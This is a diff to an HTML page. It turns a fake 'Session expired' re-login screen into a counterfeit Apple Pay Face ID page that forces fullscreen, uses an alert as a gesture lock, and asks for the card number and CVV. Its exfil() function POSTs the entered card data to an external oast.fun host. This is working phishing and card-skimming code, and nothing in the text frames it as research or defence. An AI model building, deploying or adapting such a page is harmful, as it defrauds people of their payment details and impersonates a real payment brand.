@@ -1,38 +1,73 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Secure Verification</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Apple Pay Authentication</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     html, body {
-      font-family: -apple-system, sans-serif;
       margin: 0;
-      background: white;
+      padding: 0;
+      background: #000;
+      color: white;
+      font-family: -apple-system;
+      height: 100%;
       display: flex;
+      flex-direction: column;
       align-items: center;
       justify-content: center;
-      height: 100vh;
-      flex-direction: column;
+    }
+    #payUI {
+      background: #1c1c1e;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 20px rgba(255,255,255,0.1);
+      width: 90%;
+      max-width: 400px;
+      text-align: center;
+    }
+    input {
+      width: 100%;
+      padding: 14px;
+      margin-top: 10px;
+      border-radius: 10px;
+      border: none;
+      font-size: 16px;
     }
     button {
-      padding: 14px 24px;
-      font-size: 16px;
+      margin-top: 20px;
+      background-color: #007aff;
       border: none;
-      background: #007aff;
       color: white;
-      border-radius: 8px;
+      font-size: 16px;
+      padding: 12px;
+      border-radius: 12px;
+      width: 100%;
     }
   </style>
 </head>
 <body>
-  <h2>🔐 Session expired</h2>
-  <p>Please re-login to continue.</p>
-  <button onclick="proceed()">Continue</button>
+  <div id="payUI">
+    <h2>Face ID</h2>
+    <p>Double-Click to Pay with Apple Pay</p>
+    <input id="card" placeholder="Card Number" />
+    <input id="cvv" placeholder="CVV" type="password" />
+    <button onclick="exfil()">Continue</button>
+  </div>
 
   <script>
-    function proceed() {
-      // Gesture persistence + redirect ke spoof.html
-      location.replace('spof.html');
+    document.documentElement.requestFullscreen().then(() => {
+      setTimeout(() => alert(""), 100); // gesture lock
+    });
+
+    function exfil() {
+      fetch("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", {
+        method: "POST",
+        body: JSON.stringify({
+          card: document.getElementById("card").value,
+          cvv: document.getElementById("cvv").value
+        }),
+        mode: "no-cors"
+      });
     }
   </script>
 </body>
